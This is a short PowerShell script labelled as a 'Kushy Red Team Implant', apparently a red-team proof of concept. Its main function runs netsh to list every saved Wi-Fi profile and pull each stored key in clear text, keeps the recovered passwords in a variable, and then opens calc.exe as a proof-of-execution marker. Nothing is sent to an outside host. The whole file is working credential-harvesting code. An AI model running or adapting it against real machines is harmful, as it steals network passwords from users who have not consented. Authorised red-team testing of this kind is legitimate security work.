Write-Host "Hello World from Kushy Red Team Implant"

function Get-WifiCredentials {
    (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object {
        $profile = ($_ -split ': ')[1].Trim()
        $password = (netsh wlan show profile name="$profile" key=clear) -match 'Key Content' |
            ForEach-Object {
                ($_ -split ': ')[1].Trim()
            }
        [PSCustomObject]@{
            ProfileName = $profile
            Password    = if ($password) { $password } else { 'N/A' }
        }
    }
}
$credentials = Get-WifiCredentials

Start-Process calc.exe
